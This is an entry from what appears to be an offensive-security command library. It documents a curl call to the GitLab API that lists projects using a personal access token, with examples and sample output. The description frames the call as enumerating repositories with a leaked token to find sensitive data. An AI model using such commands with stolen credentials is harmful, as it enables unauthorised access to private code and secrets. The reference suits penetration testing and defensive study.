---
id: abab7065-f34c-443f-9bf2-119477785f25
name: curl-gitlab-api-list-projects
type: command
executor: bash
data: >-
  curl
  "https://gitlab.example.com/api/v4/projects?private_token=$_PRIVATE_TOKEN"
output: null
created_at: '2023-04-06T03:55:53.280655+00:00'
updated_at: '2023-04-06T03:55:53.289212+00:00'
platforms:
  - Linux
  - macOS
  - Windows (with curl)
tags:
  - api
  - gitlab
  - credential-access
verified: true
validated: true
---

# curl-gitlab-api-list-projects

## Command

```bash
curl "https://gitlab.example.com/api/v4/projects?private_token=$_PRIVATE_TOKEN"
```

## Description

This command queries the GitLab API to retrieve a list of all projects accessible to the authenticated user via a Personal Access Token (PAT). It is used in scenarios where a leaked PAT has been obtained, allowing enumeration of repositories and potential discovery of sensitive data.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_PRIVATE_TOKEN | The GitLab Personal Access Token for authentication (e.g., glpat-XXXXXXXXXXXXXXXXXXXX) | Yes |
| https://gitlab.example.com | The base URL of the GitLab instance (replace with target domain) | Yes (configurable) |
| /api/v4/projects | The API endpoint for listing projects | Built-in |
| ?private_token= | Query parameter for passing the token | Built-in |

## Examples

### Basic Usage

```bash
curl "https://gitlab.example.com/api/v4/projects?private_token=glpat-abc123def456"
```

### With Output Formatting (using jq)

```bash
curl "https://gitlab.example.com/api/v4/projects?private_token=$_PRIVATE_TOKEN" | jq '.[].name'
```

### Paginated Request (for large numbers of projects, add per_page)

```bash
curl "https://gitlab.example.com/api/v4/projects?private_token=$_PRIVATE_TOKEN&per_page=100&page=1"
```

## Expected Output

A JSON array of project objects on success (HTTP 200):

```json
[
  {
    "id": 4,
    "name": "Diaspora",
    "path": "diaspora",
    "path_with_namespace": "group1/diaspora",
    "visibility_level": "private"
  },
  {
    "id": 5,
    "name": "Gitorious",
    "path": "gitorious",
    "path_with_namespace": "group1/gitorious",
    "visibility_level": "internal"
  }
]
```

On failure (e.g., invalid token), expect:

```json
{"message":"401 Unauthorized"}
```

## Related

- [[procedures/Exploit-GitLab-Personal-Access-Token-to-List-Projects]]
- [[tools/cURL]] (base tool documentation)
